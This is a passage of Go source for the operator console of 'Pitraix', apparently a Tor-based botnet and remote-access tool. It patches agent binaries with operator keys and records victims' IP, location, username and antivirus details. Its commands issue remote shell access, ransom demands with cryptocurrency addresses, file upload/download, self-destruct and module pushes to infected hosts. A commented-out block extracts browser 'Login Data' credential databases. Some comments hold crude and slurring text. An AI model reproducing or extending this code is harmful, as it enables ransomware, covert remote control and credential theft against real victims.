		operPrivKey = priv

        f, _ := os.Create("OPER_PrivateKey.pitraix")
        f.WriteString(priv_pem)
        f.Close()


		// fmt.Println("wrote:", pub_pem)
        f, _ = os.Create("OPER_PublicKey.pitraix")
        f.WriteString(pub_pem)
        f.Close()

        for _, v := range []string{"lyst_windows.go", "lyst_windows.exe", "lyst_linux.go", "lyst_linux"} {       
			file, err := os.Open(v)
			if err != nil {
				fmt.Printf("%sWarning >%s Make sure you have %s%s%s in the same folder\n", yellowColor, endColor, yellowColor, v, endColor)
			} else {
					fs, _ := file.Stat()
					b := make([]byte, fs.Size())

					for {
						_, err := file.Read(b)
						if err != nil {
							break
						}
					}
					file.Close()

					nb := bytes.Replace(b, []byte("RXLCJAFYNIYZRZMWTZNMIYVSKFUAYJFSZUDIKNRNPMHOTDVSCRGLYTATTRGKGHPWDUMGEUHTTMEBAJRNEOYRDDUDMNWGBWEOASVYVGZZCRXIRUZIFBPAVMZZEWATVSYQNYDJLZPSMYGTOPUSPBRASSWWFOQGWZLRCWQMVKCXTUFGSIVPDKCLLWDIFAWWCVXBXUKOKALCPQKBWGRFTFGZQGZUOAHOZYSSWOBCZKEBLWFBJBQZTXCGZOJIDCYHGWSJGCNAVXAIZUDPPUIIFWYZKYASBNWDVIHCOSYNSTWENAJJSUPXAUSVSXYTVDNYGMVTHAQAURQVKTWYOBOSLFKYWOSPZJTRKQLLOPJTGNOXGGHCTNATRCBGVAIMFWSSTRJSJACBJFQRUJRGESXYSSIUIYWFEDZHSPEEIHSRCFAOCWRRQJMDOOFZOLNPXWDUWXATEBIDKFMZBMSNMPMCYNJNGQGARSVPAWWFDVTGNEXVIRZVXJNXIIWEZKSGPERFKUXTFDHMRSBXUVDQJSUCLMIHYFVRIZRJKSLBEWKDVYFXMDMELBTLCGORDJFJPWNDEXVNXVVXYTAAMYKWYSHZDNVAZYTCBYOLBIJAWBGKVTHWVOEEULFWXEZQNSCWVRMUGIBYUHUIKEVMPDAOMSKXAXZSEHCYIMIIAFLFBBFMTZMOIAHKPUVXNKIUGWETMFSPEEXKOGPCQRLKSGMLZTAWKFDMCQLGPZFDDOHHKPIBOJCKDIGAKWYADJQTOFHWPXKBGYELBQELQULTTIQNJFCBHJAUYCEUOIZAFOVEKDQAKLW"), []byte(pub_pem), -1)
					// nb = bytes.Replace(b, []byte("~~YOUR RSA PRIVATE KEY - RUN SETUPCRYPTO.GO~~"), []byte(priv_pem), 1)
					nb = bytes.Replace(nb, []byte("SNOGOYXKJWNZRYZFLHRJBLAVLLNXLMNBDDPJPJGKMJJDYDLVQSUIDPZA"), []byte(agentAddress), -1)

					f, _ := os.Create(v)
					f.Write(nb)
					f.Close()
			}
        }
		fmt.Println(greenColor + ">" + endColor + " Done.")
		fmt.Println(yellowColor + ">" + endColor + " As this is your first time, Remember that instructions don't execute as you write them! you have to confirm sending by typing \"instru\" after you have entered all of desired instruction sequence")

	} else {
		operPrivKey, err = ParseRsaPrivateKeyFromPemStr(string(operPrivKeyTmp1))
		if err != nil {
			fmt.Println("Error parsing OPER_PrivateKey:", err)
			os.Remove("OPER_PrivateKey")
			os.Exit(0)
		}
	}
	
	go logUpdaterAsync()

	os.MkdirAll("modules", os.ModePerm)
	os.MkdirAll("extracted", os.ModePerm)
	
	var modules modules_type
	modules.loadModules("modules", &hostring_d)

	onetimeKey = hex.EncodeToString(random_Bytes(45, true))
	twotimeKey = hex.EncodeToString(random_Bytes(45, true))


	// This will fetch latest version over TOR
	// var noerror = true
	// for i := 0; i < 6; i++ {
	// 	versionCheck, err := getRequest("https://raw.githubusercontent.com/ThrillQuks/Pitraix/main/version.txt", true, -1)
	// 	if err != nil {
	// 		noerror = false
	// 	} else {
	// 		noerror = true
	// 		if strings.TrimSpace(string(versionCheck)) != version {
	// 			fmt.Printf("%s>%s New verison (fetched over TOR) is %savailable%s! Please update as %ssoon%s as you can.\n", redColor, endColor, greenColor, endColor, redColor, endColor)
	// 		}
	// 		break
	// 	}
	// 	time.Sleep(2 * time.Second)

	// }
	// if noerror == false {
	// 	fmt.Printf("%s>%s There was %serror%s fetching latest version information over %sTOR %s%s\n", redColor, endColor, redColor, endColor, redColor, err.Error(), endColor)
	// }


	// log("started", "pitrarix has loaded")
	
	fmt.Printf(`%s
	━━━━━━━┏┓━━━━━━━━━━━━━━━
	┏━━┓┏┓ ┃┃┏━━┓━┏━┓┏┓┏┓┏┓
	┃┏┓┃┣┫━┃┃━┗━┓┃━┃┏┛┣┫┗╋╋┛
	┃┗┛┃┃┃━┃┗┓┃┗┛┗┓┃┃━┃┃┏╋╋┓
	┃┏━┛┗┛━┗━┛┗━━━┛┗┛━┗┛┗┛┗┛
	┃┃━━━━━━━━━━━━━━━━━━━━━━
	┗┛━━━━━━━━━━━━━━━━━━━━━━ %s%s

`, redColor, version, endColor)

	fmt.Printf("%s>%s Fetching %sonline%s Agents\n", blueColor, endColor, greenColor, endColor)
	online_AGS := fetchOnlineAGS(hostring_d, all_AGS)
	fmt.Printf("%s>%s Online Agents %s%d%s\n", blueColor, endColor, greenColor, len(online_AGS), endColor) //, online_AGS) // DEBUG
	fmt.Printf("%s>%s All Agents    %s%d%s\n", blueColor, endColor, blueColor, len(all_AGS), endColor) //, all_AGS)		    // DEBUG
	fmt.Printf("%s>%s All Hosts     %s%d%s\n\n", blueColor, endColor, blueColor, len(hostring_d.Address), endColor) // , hostring_d.Address)
	
	fmt.Printf("%s>%s Loaded %sPitraix%s\n\n", blueColor, endColor, greenColor, endColor)

	hostRing_FileChn := make(chan t_HSTSingle)

	go func(chn chan t_HSTSingle, hrd *t_HST) { // race-safe file write function
		for {
			newHST, ok := <- chn
			if ok == false {
				break
			}
			if adv_antiddos_check(newHST.Address, newHST.Key) {
				hrd.Address  = append(hrd.Address , newHST.Address)
				hrd.IP       = append(hrd.IP	  , newHST.IP)
				hrd.Country  = append(hrd.Country , newHST.Country)
				hrd.City     = append(hrd.City	  , newHST.City)
				hrd.CPU 	 = append(hrd.CPU	  , newHST.CPU)
				hrd.RAM 	 = append(hrd.RAM	  , newHST.RAM)
				hrd.Username = append(hrd.Username, newHST.Username)
				hrd.Hostname = append(hrd.Hostname, newHST.Hostname)
				hrd.Chassis  = append(hrd.Chassis , newHST.Chassis)
				hrd.OS 	 	 = append(hrd.OS	  , newHST.OS)
				hrd.OSVar 	 = append(hrd.OSVar	  , newHST.OSVar)
				hrd.Kernel 	 = append(hrd.Kernel  , newHST.Kernel)
				hrd.MacAddr  = append(hrd.MacAddr , newHST.MacAddr)
				hrd.Arch 	 = append(hrd.Arch	  , newHST.Arch)
				hrd.Vendor 	 = append(hrd.Vendor  , newHST.Vendor)
				hrd.Model 	 = append(hrd.Model	  , newHST.Model)
				hrd.ContactD = append(hrd.ContactD, newHST.ContactD)
				hrd.AV		 = append(hrd.AV, newHST.AV)

				hrd.Routes 	 = append(hrd.Routes, []int{})

				hrd.Key 	 = append(hrd.Key, newHST.Key)
				hrd.RasKey   = append(hrd.RasKey, newHST.RasKey)
				
				jsonDump, _ := json.MarshalIndent(hrd, "", " ")
				f, err := os.Create("hostring.json")

				if err != nil {
					fmt.Printf("\n%s>%s There was %serror%s creating hostring file. Please open issue on github: https://github.com/ThrillQuks/Pitraix/issues\n", redColor, endColor, redColor, endColor)

				} else {
					f.Write(jsonDump)
					fmt.Printf("\n\n%s>%s New host register! Host count is now %s%d%s\n\n", greenColor, endColor, greenColor, len(hostring_d.Address), endColor)
					f.Close()
					
					// if auto_spread == true {
					// 	go func(addr string, key string) {
					// 		fmt.Println("doing browser snatch for", addr, key)

					// 		hstAES_Key, _ := base64.StdEncoding.DecodeString(key)

					// 		insts_marshalled, _ := json.Marshal([]string{"getwsbrowserkey 1"})

					// 		browserS_onetimeKeyTMP, err := doInstru(addr, insts_marshalled, hstAES_Key, true)

					// 		browserS_onetimeKey := strings.TrimSpace(strings.Replace(string(browserS_onetimeKeyTMP), "<PiTrIaXMaGGi$N$9a1n>", "", -1))

					// 		if err != nil {
					// 			fmt.Printf("\n%s>%s Host is %soffline%s\n", redColor, endColor, redColor, endColor)

					// 		} else {
					// 			fmt.Println("browserS_onetimeKey:", browserS_onetimeKey, err)

					// 			proxyURL, _ := url.Parse("SOCKS5://127.0.0.1:9050")

					// 			wsdialer := websocket.Dialer{
					// 				Proxy: http.ProxyURL(proxyURL),
					// 			}

					// 			c, _, err := wsdialer.Dial("ws://" + addr + ".onion/websocket" + browserS_onetimeKey, nil) // websocket.DefaultDialer.Dial("ws://" + addr + ".onion/websocket", NetDial: dialer,)
								
					// 			if err != nil {
					// 				fmt.Printf("\n%s>%s Host closed connection abrubtly %s%s%s\n", redColor, endColor, redColor, err.Error(), endColor)

					// 			} else {
					// 				defer c.Close()

					// 				err := c.WriteMessage(websocket.TextMessage, []byte("baddie"))
					// 				if err != nil {
					// 					fmt.Println("write error:", err)

					// 				} else {
					// 					var bigdick string
					// 					for {
					// 						_, message, err := c.ReadMessage()

					// 						if err != nil {
					// 							fmt.Println("read error:", err)
					// 							break

					// 						} else {
					// 							// fmt.Println(message)

					// 							if string(message) == "hadie" {
					// 								break

					// 							} else {
					// 								bigdick += string(message) + " "
													
					// 							}

					// 						}

					// 					}

					// 					bigdick_split := strings.Split(strings.TrimSpace(bigdick), " ")

					// 					/* 
					// 						my dick is big. slices are in order i think
					// 						1. login data

					// 					*/

					// 					fileNames := []string{
					// 						"Login Data",
					// 						"Login Data",
					// 					}

					// 					os.MkdirAll(filepath.Join("extracted", addr), os.ModePerm)

					// 					fname_time := time.Now().String()
					// 					for index, dick := range bigdick_split {
					// 						if index > len(fileNames) - 1 {
					// 							fmt.Println("oh bruh", index, len(dick), len(bigdick_split))
					// 							continue
					// 						}
					// 						content, err := base64.StdEncoding.DecodeString(dick)

					// 						if err != nil {
					// 							fmt.Println("oh noo error", err)
					// 						}

					// 						fname := fileNames[index] + "_" + fname_time
					// 						f, _ := os.Create(filepath.Join("extracted", addr, fname + ".sql"))
					// 						f.Write(content)
					// 						f.Close()

					// 					}

					// 					for index, _ := range fileNames {
					// 						fname := fileNames[index] + "_" + fname_time
					// 						db, err := sql.Open("sqlite3", filepath.Join("extracted", addr, fname + ".sql"))
											
					// 						if err != nil{
					// 							fmt.Println("uh", err)
											
					// 						} else {
					// 							response, _ := db.Query("SELECT * from logins", rollno, 1)
					// 							type row struct {
					// 								Passowrds string `guacamole nigga penis"`
					// 							}
					// 							var rows []row
					// 							_ = response.Scan(&rows)
					// 							count := rows[0].Count
					// 							if err != nil {
					// 								fmt.Println(err)
					// 							}
					// 							fmt.Println(row, err)


					// 						}

					// 					}


					// 				}


									
					// 			}
							
					// 		}


					// 	}(newHST.Address, newHST.Key)
					// }

				}

			} else {
				go log("adv_antiddos_check", "CRITICAL ERROR onion service unreachable: " + newHST.Address)

			}

		}

	}(hostRing_FileChn, &hostring_d)
	
	go func() { // input/output function
		var (
			history []string
			operand  int = 0 // 0 = null; 1 = Global instruct entire hostring; 2 = Select Instruct selected hostring
			crout    int = 0 // 0 = null; 1 = Use Agents; 2 = Instruct directly
			selected []int   // is required only if operand is false
		)

		operand_Modes := []string{"EMPTY", "GLOBAL", "SELECT"}
		crout_Modes   := []string{"EMPTY", "RELAY", "DIRECT"}

		scanner := bufio.NewScanner(os.Stdin)

		for {
			var instructions []string
			var instruFlag bool = false		
			var shellrt = ""
			var shellrtSel int = -1
			
			for {
				if instruFlag == true {
					break
				}
				// fmt.Println(operand, crout, selected)

				if shellrtSel == -1 {
					if operand == 0 && crout == 0 {
						fmt.Printf("%s>>%s ", blueColor, endColor)

					} else if crout > 0 && operand == 0 {
						fmt.Printf("%s%s >>%s ", blueColor, crout_Modes[crout], endColor)

					} else if operand > 0 && crout == 0 {
						if operand == 1 || len(selected) == 0 {
							fmt.Printf("%s%s%s %s>>%s ", greenColor, operand_Modes[operand], endColor, blueColor, endColor)
						} else {
							fmt.Printf("%s%s %d%s %s>>%s ", greenColor, operand_Modes[operand], len(selected), endColor, blueColor, endColor)
						}
					} else {
						fmt.Printf("%s%s%s %s%s >>%s ", greenColor, operand_Modes[operand], endColor, blueColor, crout_Modes[crout], endColor)
					}

				} else {
					fmt.Printf("%s%s>%s ", blueColor, shellrt, endColor)
				}

				scanner.Scan()
				line := scanner.Text()
				
				if len(strings.TrimSpace(line)) == 0 {
					continue
				}

				line_splitted := strings.Split(strings.TrimSpace(line), " ")
				var line_instru string

				if len(line_splitted) > 1 {
					line_instru = line[len(line_splitted[0]) + 1:]

				} else {
					line_instru = line[len(line_splitted[0]):]
				}

				if shellrtSel != -1 {
					if strings.ToLower(strings.TrimSpace(line)) == "exit" {
						shellrtSel = -1
						shellrt = ""
						fmt.Printf("\n%s>%s Exited\n\n", redColor, endColor)

					} else {
						addr := hostring_d.Address[shellrtSel]
						hstAES_Key, _ := base64.StdEncoding.DecodeString(hostring_d.Key[shellrtSel])
						insts_marshalled, _ := json.Marshal([]string{"shell " + line})
						out, err := doInstru(addr, insts_marshalled, hstAES_Key, true)
						if err != nil {
							fmt.Printf("\n%s>%s Host is %soffline%s\n", redColor, endColor, redColor, endColor)
							shellrtSel = -1
							shellrt = ""

						} else {
							fmt.Println(strings.TrimSpace(strings.Replace(string(out), "<PiTrIaXMaGGi$N$9a1n>", "", -1)) + "\n")
						}
						
					}

				} else {
					switch (strings.ToLower(line_splitted[0])) {

					case "select":
						if strings.TrimSpace(line_instru) == "" {
							fmt.Printf("%s>%s Usage: select [index/username/country/city/platform]\n\n", redColor, endColor)
							continue
						}

						if line_instru == "*" {
							operand = 1
						} else {
							operand = 2

							matchesCount := 0

							line_instru_splitted := strings.Fields(line_instru)

							for index, _ := range hostring_d.Address {

								found := true

								for _, k := range line_instru_splitted {
									var os string
									var osvar string = strings.Fields(hostring_d.OSVar[index])[0]

									if hostring_d.OS[index] == 0 {
										os = "linux"

									} else if hostring_d.OS[index] == 1 {
										os = "windows"

									} else {
										os = "unknown"
									
									}
									
									if strconv.Itoa(index + 1) == k || hostring_d.Country[index] == strings.ToUpper(k) || hostring_d.City[index] == k || hostring_d.Username[index] == k || hostring_d.Hostname[index] == k || os == strings.ToLower(k) || osvar == k {
										// fmt.Println(matchesCount, k)
										matchesCount++
										// break
										
									} else {
										found = false

									}

								}

								if found == true && !contains(selected, index) {
									// fmt.Println("selected", index, k)
									selected = append(selected, index)

								}

							}

							// fmt.Println(matchesCount, len(line_instru_splitted), line_instru_splitted)
							if matchesCount != len(line_instru_splitted) {

								fmt.Printf("%s>%s No matching hosts were found\n", redColor, endColor)
							}
							
						}
					
					case "info":
						if strings.TrimSpace(line_instru) == "" {
							fmt.Printf("%s>%s Usage: info [index]\n\n", redColor, endColor)
							continue

						}

						index, err := strconv.Atoi(line_splitted[1])
						
						if err != nil || index > len(hostring_d.Address) {
							fmt.Printf("%s>%s invalid index %s%s%s\n", redColor, endColor, redColor, line_splitted[1], endColor)
							continue

						}

						address := hostring_d.Address[index  - 1]
						country := hostring_d.Country[index  - 1]

						ip    := hostring_d.IP[index  - 1]
						ostmp := hostring_d.OS[index  - 1]
						city  := hostring_d.City[index  - 1]
						cpu   := hostring_d.CPU[index  - 1]
						ram   := hostring_d.RAM[index  - 1]

						username   := hostring_d.Username[index  - 1]
						hostname   := hostring_d.Hostname[index  - 1]
						chassistmp := hostring_d.Chassis[index  - 1]
						osvariant  := hostring_d.OSVar[index  - 1]
						kernel  := hostring_d.Kernel[index  - 1]
						macaddr := hostring_d.MacAddr[index  - 1]
						archtmp := hostring_d.Arch[index  - 1]
						vendor  := hostring_d.Vendor[index  - 1]
						model   := hostring_d.Model[index  - 1]
						contactdate := hostring_d.ContactD[index  - 1]
						avtmp := hostring_d.AV[index  - 1]


						var av, os, arch, chassis string

						if avtmp == "" {
							av = "None"
						}

						if ostmp == 0 {
							os = "Linux"
						}
						if archtmp == 0 {
							arch = "x86-64"

						} else if archtmp == 1 {
							arch = "x86"

						} else {
							arch = "Unknown"
						}

						if chassistmp == 0 {
							chassis = "Desktop"

						} else {
							chassis = "Laptop"
						}

						fmt.Printf(
							"Onion Address > %s%s%s\nIP > %s%s%s\nCountry > %s%s%s\nCity > %s%s%s\nCPU > %s%s%s\nRAM > %s%s%s\nUsername > %s%s%s\nHostname > %s%s%s\nDevice Type > %s%s%s\nOS > %s%s%s\nOS Version > %s%s%s\nKernel > %s%s%s\nMac Address > %s%s%s\nArch > %s%s%s\nDevice Vendor > %s%s%s\nDevice Model > %s%s%s\nContact Date > %s%s%s\nAnti-Malware > %s%s%s\n",
							blueColor,
							address + ".onion",
							endColor,
							blueColor,
							ip,
							endColor,
							blueColor,
							country,
							endColor,
							blueColor,
							city,
							endColor,
							blueColor,
							cpu,
							endColor,
							blueColor,
							ram,
							endColor,
							blueColor,
							username,
							endColor,
							blueColor,
							hostname,
							endColor,
							blueColor,
							chassis,
							endColor,
							blueColor,
							os,
							endColor,
							blueColor,
							osvariant,
							endColor,
							blueColor,
							kernel,
							endColor,
							blueColor,
							macaddr,
							endColor,
							blueColor,
							arch,
							endColor,
							blueColor,
							vendor,
							endColor,
							blueColor,
							model,
							endColor,
							blueColor,
							contactdate,
							endColor,
							blueColor,
							av,
							endColor,
						)


					case "show":
						if len(line_splitted) != 2 {
							fmt.Printf("%s>%s Usage: show %s[modules/credits]%s\n\n", redColor, endColor, redColor, endColor)
							continue
						}

						if strings.HasPrefix(strings.ToLower(line_splitted[1]), "credit") || strings.HasPrefix(strings.ToLower(line_splitted[1]), "creator") || strings.HasPrefix(strings.ToLower(line_splitted[1]), "maker") {
							fmt.Printf("%s>%s This was made completely by %s@MrCypher16%s\n%s>%s Please Donate for more updates, any amount is not small\n\n%sMonero  %s 85HjZpxZngajAEy2123NuXgu1PnNyq2DLSkkr93cyT8QQVae1GruhL4hHAtnaFqeCF7Vo9eW2P11Sig8DDqzVzCSE95NaW6\n%sBitcoin %s bc1q2dqk9u06vv2j5p6yptj9ex7epfv77sxjygnrnw\n\nThanks.\n\n", greenColor, endColor, redColor, endColor, greenColor, endColor, blueColor, endColor, blueColor, endColor)

						} else if strings.HasPrefix(strings.ToLower(line_splitted[1]), "mod") {
							fmt.Printf("%s>%s Enabled modules count %s%d%s\n\n", blueColor, endColor, blueColor, len(modules.ID), endColor)
							for indx, id := range modules.ID {
								fmt.Printf("%s%d >%s Module Name %s%s%s  Module ID %s%s%s\n", blueColor, indx + 1, endColor, blueColor, modules.Name[indx], endColor, blueColor, id, endColor)
							}

						}

					case "instru":
						if len(instructions) == 0 {
							fmt.Printf("%s>%s No previous instructions to execute\n\n", redColor, endColor)
							continue
						}

						if operand == 0 {
							fmt.Printf("%s>%s No %soperand%s specificed.\n\n", redColor, endColor, greenColor, endColor)
							continue
							
						} else if crout == 0 {
							fmt.Printf("%s>%s No %scrout%s specificed.\n\n", redColor, endColor, blueColor, endColor)
							continue
						}

						if operand == 1 && !confirm_global() {
							continue
						}

						instruFlag = true

					case "hist", "history":
						for i, l := range history {
							fmt.Printf("%s%d.%s %s\n", blueColor, i + 1, endColor, l)
						}
						fmt.Print("\n")
						continue

					case "operand":
						if line_instru == "global" || line_instru == "1" {
							operand = 1
							fmt.Printf("%s>%s Switched operand to GLOBAL\n", blueColor, endColor)

						} else if line_instru == "select" || line_instru == "2" {
							operand = 2
							fmt.Printf("%s>%s Switched operand to SELECT\n", blueColor, endColor)

						} else {
							fmt.Printf("%s>%s Invalid operand %s%s%s\n", redColor, endColor, redColor, line_instru, endColor)
						}

					case "crout":
						// insts = append(insts, line)
						if line_instru == "relay" || line_instru == "1" {
							crout = 1
							fmt.Printf("%s>%s Switched crout to RELAY\n", blueColor, endColor)

						} else if line_instru == "direct" || line_instru == "2" {
							crout = 2
							fmt.Printf("%s>%s Switched crout to DIRECT\n", blueColor, endColor)

						} else {
							fmt.Printf("%s>%s Invalid crout %s%s%s\n", redColor, endColor, redColor, line_instru, endColor)

						}

					case "ls", "list":
						if len(hostring_d.Address) == 0 {
							fmt.Printf("\n%s>%s You currently have %szero%s hosts\n", redColor, endColor, redColor, endColor)
							continue
						}

						// insts = append(insts, line)
						// ┌───┬────────────┬────────────┬───────────────┬─────┐
						fmt.Printf(`
     %s┌────┬──────────┬──────────────┬────────────────┬──────────────┬──────────────┐%s
      %s CN     City       Username        Hostname      	    OS        Contact Date%s 
     %s└────┴──────────┴──────────────┴────────────────┴──────────────┴──────────────┘%s %s`, blueColor, endColor, greenColor, endColor, blueColor, endColor, "\n")

						for index, _ := range hostring_d.Address {
							// index + 1 for readiblity
							fmt.Printf("%s%d > %s ", greenColor, index + 1, endColor)
							
							// Country
							str, big := neatierList(hostring_d.Country[index], 3, 2)
							// if big == true {
							// 	fmt.Printf(" %s..", str)
							// } else {
							fmt.Printf("  %s", str)
							// }

							// City
							str, big = neatierList(hostring_d.City[index], 10, 8)
							if big == true {
								fmt.Printf(" %s..", str)

							} else {
								fmt.Printf(" %s", str)
							}


							// Username
							str, big = neatierList(hostring_d.Username[index], 14, 12)
							if big == true {
								fmt.Printf(" %s..", str)

							} else {
								fmt.Printf(" %s", str)
							}

							// Hostname
							str, big = neatierList(hostring_d.Hostname[index], 16, 15)
							if big == true {
								fmt.Printf(" %s..", str)
								
							} else {
								fmt.Printf(" %s" , str)
							}

							// OS
							var os string
							if hostring_d.OS[index] == 1 {
								os = "Windows"
								osvar := hostring_d.OSVar[index][27:len(hostring_d.OSVar[index]) - 1]
								osvarspl := strings.Split(osvar, ".")
								if len(osvar) > 0 {
									if osvarspl[0] == "6" {
										osvarspl[0] = "7"
									}
									os = os + " " + osvarspl[0]
								}
							} else if hostring_d.OS[index] == 0 {
								os = hostring_d.OSVar[index]
								
							} else {
								os = "Unknown"
							}

							str, big = neatierList(os, 14, 12)
							if big == true {
								fmt.Printf(" %s..", str)

							} else {
								fmt.Printf("  %s", str)
							}

							str, big = neatierList(readableContactDate(hostring_d.ContactD[index]), 16, 14)
							if big == true {
								fmt.Printf(" %s..", str)
							} else {
								fmt.Printf("  %s", str)
							}
							fmt.Print("\n")
						}

					case "help", "?":
						index := 1
						for cmd, info := range commands {
							fmt.Printf("%s%d > %s%s%s %s %s\n", greenColor, index, endColor, blueColor, cmd, endColor, info)
							index++
						}
					
					case "wallpaper":
						if strings.TrimSpace(line_instru) == "" {
							fmt.Printf("%s>%s Cannot have %sempty%s wallpaper path\n", redColor, endColor, redColor, endColor)
							continue
						}
						
						instructions = append(instructions, strings.ToLower(line_splitted[0]) + " " + line_instru)

					case "ransom":
						if len(line_splitted) != 4 {
							fmt.Printf("%s>%s Usage is: ransom [Amount] [Bitcoin/Monero] [Address]\n\n", redColor, endColor)
							continue
						}

						instructions = append(instructions, strings.ToLower(line_splitted[0]) + " " + line_instru)

						// if confirm_global() {
						// 	var confirm string
						// 	fmt.Printf("%s>%s Last chance, are you %ssure%s? [%sY%s/%sN%s] ", yellowColor, endColor, greenColor, endColor, blueColor, endColor, redColor, endColor)
						// 	fmt.Scanf("%s", &confirm)
						// 	if strings.ToLower(confirm) != "y" && strings.ToLower(confirm) != "yes" {
						// 		fmt.Printf("%s>%s Aborted.\n", redColor, endColor)
						// 		continue
						// 	}

						// 	fmt.Println("lets go.")
						// }

					case "selfdestruct", "deinfect":
						var confirm string
						
						fmt.Printf("%s>%s This will completely %sremove pitraix%s! add to instructions queue? [%sY%s/%sN%s] ", yellowColor, endColor, greenColor, endColor, blueColor, endColor, redColor, endColor)
						
						fmt.Scanf("%s", &confirm)

						if strings.ToLower(confirm) != "y" && strings.ToLower(confirm) != "yes" {
							fmt.Printf("%s>%s Aborted.\n", redColor, endColor)
							continue

						}

						instructions = append(instructions, "selfdestruct 1")

					case "decrypt":
						
						instructions = append(instructions, strings.ToLower(line_splitted[0]) + " 1")

					case "notify":
						if len(line_splitted) < 3 {
							fmt.Printf("%s>%s Usage: notify %s[Title] [Message]%s\n\n", redColor, endColor, redColor, endColor)
							continue
						}

						// fmt.Println(len(line_splitted), len(line_splitted) < 3)
						instructions = append(instructions, strings.ToLower(line_splitted[0]) + " " + line_instru)
					
					case "noop":
						
						instructions = append(instructions, "noop 1")

					case "unzip":
						if strings.TrimSpace(line_instru) == "" {
							fmt.Printf("%s>%s Cannot have %sempty path%s to unzip\n", redColor, endColor, redColor, endColor)
							continue
						}

						instructions = append(instructions, strings.ToLower(line_splitted[0]) + " " + line_instru)

					// case "untar":
					// 	if strings.TrimSpace(line_instru) == "" {
					// 		fmt.Printf("%s>%s Cannot have %sempty path%s to untar\n", redColor, endColor, redColor, endColor)
					// 		continue
					// 	}
					// 	instructions = append(instructions, line)

					case "beep":
						if len(line_splitted) != 3 {
							fmt.Printf("%s>%s Usage: beep %s[Frequency in Hz] [Duration in Seconds]%s\n\n", redColor, endColor, redColor)
							continue
						}

						instructions = append(instructions, strings.ToLower(line_splitted[0]) + " " + line_instru)

					case "download":
						// make relay output
						// if crout != 2 {
						// 	fmt.Printf("%s>%s Cannot relay %sdownload%s instruction\n", redColor, endColor, redColor, endColor)
						// 	continue
						// }
						
						// insts_marshalled = json.Marshal([]string{""})
						// fmt.Printf("%s%d >%s Instructing %s%s%s directly\n", greenColor, index + 1, endColor, greenColor, hstAddress, endColor)

						// out, err := doInstru(hstAddress, insts_marshalled, hstAES_Key, true)
						// // fmt.Println(out, err)
						// if err == nil {
						// 	fmt.Printf("\n%sout >%s %s\n\n", blueColor, endColor, string(out))
						// } else {
						// 	fmt.Println(hstAddress, "is offline")
						// }

						if strings.TrimSpace(line_instru) == "" {
							fmt.Printf("%s>%s Cannot have %sempty%s path\n\n", redColor, endColor, redColor, endColor)
							continue

						}

						instructions = append(instructions, strings.ToLower(line_splitted[0]) + " " + line_instru)
					
					case "upload":
						if len(line_splitted) != 2 {
							fmt.Printf("%s>%s Usage: upload [File name]\n\n", redColor, endColor)
							continue

						}

						if file_Exists(line_splitted[1]) {
							f, err := readFile(line_splitted[1])
							
							if err == nil {
								instructions = append(instructions, "upload " + filepath.Base(line_splitted[1]) + " " + base64.StdEncoding.EncodeToString(f))

							} else {
								fmt.Printf("%s>%s Error while reading file %s%s%s\n", redColor, endColor, redColor, line_splitted[1], endColor)

							}

						} else {
							fmt.Printf("%s>%s file %s%s%s does not exist\n", redColor, endColor, redColor, line_splitted[1], endColor)

						}					

					case "shell":
						if strings.TrimSpace(line_instru) == "" {
							fmt.Printf("%s>%s Cannot have %sempty%s shell command\n", redColor, endColor, redColor, endColor)
							continue

						}
						
						instructions = append(instructions, strings.ToLower(line_splitted[0]) + " " + line_instru)

					case "shellrt":
						if len(line_splitted) == 2 {
							index, err := strconv.Atoi(line_splitted[1])

							if err != nil || index > len(hostring_d.Address) {
								fmt.Printf("%s>%s invalid index %s%s%s\n", redColor, endColor, redColor, line_splitted[1], endColor)
								continue

							}

							addr := hostring_d.Address[index  - 1]

							fmt.Printf("%s>%s Establishing %sconnection..%s", yellowColor, endColor, greenColor, endColor)

							hstAES_Key, _ := base64.StdEncoding.DecodeString(hostring_d.Key[index - 1])
							insts_marshalled, _ := json.Marshal([]string{"cufol 1"})
							out, err := doInstru(addr, insts_marshalled, hstAES_Key, true)

							if err != nil {
								fmt.Printf("\n%s>%s Host is %soffline%s\n", redColor, endColor, redColor, endColor)

							} else {

								shellrt = strings.TrimSpace(strings.Replace(string(out), "<PiTrIaXMaGGi$N$9a1n>", "", -1))
								shellrtSel = index - 1
								if hostring_d.OS[index - 1] == 1 {
									fmt.Printf("\n\n%s\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\n", hostring_d.OSVar[index - 1])

								
								}

							}

						} else {
							fmt.Printf("%s>%s you %smust%s supply host index\n", redColor, endColor, redColor, endColor)

						}
						
					case "shellnoop":
						if strings.TrimSpace(line_instru) == "" {
							fmt.Printf("%s>%s Cannot have %sempty%s shell command\n", redColor, endColor, redColor, endColor)
							continue
						}
						
						instructions = append(instructions, strings.ToLower(line_splitted[0]) + " " + line_instru)

					case "crashnearby":
						instructions = append(instructions, strings.ToLower(line_splitted[0]) + " " + line_instru)

					case "pushmods": // this code will be cleaned next release as i continue to remove duplicated code and replacing with fast goroutines
						for indx, cand := range modules.Candidates {
							fmt.Println(indx, cand)

							addr := hostring_d.Address[indx]

							fmt.Printf("%s>%s Pushing module %s%s%s to %s%s%s", yellowColor, endColor, blueColor, modules.Name[indx], endColor, blueColor, addr, endColor)
							hstAES_Key, _ := base64.StdEncoding.DecodeString(hostring_d.Key[indx])
							
							insts_marshalled, _ := json.Marshal([]string{fmt.Sprintf("push %s %s %s %s", modules.ID[indx], strings.ToLower(modules.Execution[indx]), modules.Type[indx], modules.Contents[indx])})

							out, err := doInstru(addr, insts_marshalled, hstAES_Key, true)
							if err != nil {
								fmt.Printf("\n%s>%s Host is %soffline%s\n", redColor, endColor, redColor, endColor)
							
							} else {

								fmt.Printf("\n%s>%s Updated module %s%s%s for %s%s%s!\n", greenColor, endColor, greenColor, modules.Name[indx], endColor, greenColor, addr, endColor)
								fmt.Printf("%s>%s %s\n", blueColor, endColor, strings.Replace(string(out), "<PiTrIaXMaGGi$N$9a1n>", "", -1))
							
							}

						}

					case "assign":
						if len(line_splitted) == 3 {
							firstIndex, err := strconv.Atoi(line_splitted[1])
							if err != nil || firstIndex > len(hostring_d.Address) {
								fmt.Printf("%s>%s invalid index %s%s%s\n\n", redColor, endColor, redColor, line_splitted[1], endColor)
								continue

							}

							secondIndex, err := strconv.Atoi(line_splitted[2])

							if err != nil || secondIndex > len(hostring_d.Address) {
								fmt.Printf("%s>%s invalid index %s%s%s\n", redColor, endColor, redColor, line_splitted[2], endColor)
								continue

							}
							
							if firstIndex == secondIndex {
								fmt.Printf("%s>%s Index is duplicated!\n", redColor, endColor)
								continue

							}
							
							fAddr  := hostring_d.Address[firstIndex  - 1]
